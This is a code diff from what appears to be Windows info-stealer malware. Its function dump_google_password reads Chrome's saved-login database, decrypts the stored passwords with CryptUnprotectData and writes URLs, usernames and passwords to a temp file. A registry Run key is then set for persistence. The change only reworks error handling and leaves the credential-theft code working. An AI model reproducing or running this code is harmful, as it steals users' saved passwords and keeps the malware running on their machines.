@@ -87,33 +87,28 @@ def dump_google_password():
         conn = sqlite3.connect(path)
         cursor = conn.cursor()
     except Exception:
-        sys.exit(1)
-
-    # Get the results
-    try:
-        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-    except Exception:
-        sys.exit(1)
-
-    data = cursor.fetchall()
-
-    if len(data) > 0:
-        GoogleAutoPassPath = TEMP_PATH + '//GoogleAutoPass'
-        passGoogle = open(GoogleAutoPassPath,'w')
-        for result in data:
-            # Decrypt the Password
-            try:
-                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
-            except Exception:
-                continue
-            if password:
-                try:
-                    passGoogle.write("[+] URL: %s \n    Username: %s \n    Password: %s \n" % (result[0], result[1], password))
-                except Exception:
-                    pass
-        passGoogle.close()
+        pass
     else:
-        sys.exit(0)
+        try:
+            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        except Exception:
+            pass
+        else:
+            data = cursor.fetchall()
+            GoogleAutoPassPath = TEMP_PATH + '//GoogleAutoPass'
+            passGoogle = open(GoogleAutoPassPath,'w')
+            for result in data:
+                # Decrypt the Password
+                try:
+                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+                except Exception:
+                    continue
+                if password:
+                    try:
+                        passGoogle.write("[+] URL: %s \n    Username: %s \n    Password: %s \n" % (result[0], result[1], password))
+                    except Exception:
+                        pass
+            passGoogle.close()
 
 # set the reg value in run key
 set_reg_key_value(REG_PATH,REG_NAME,REG_VALUE)
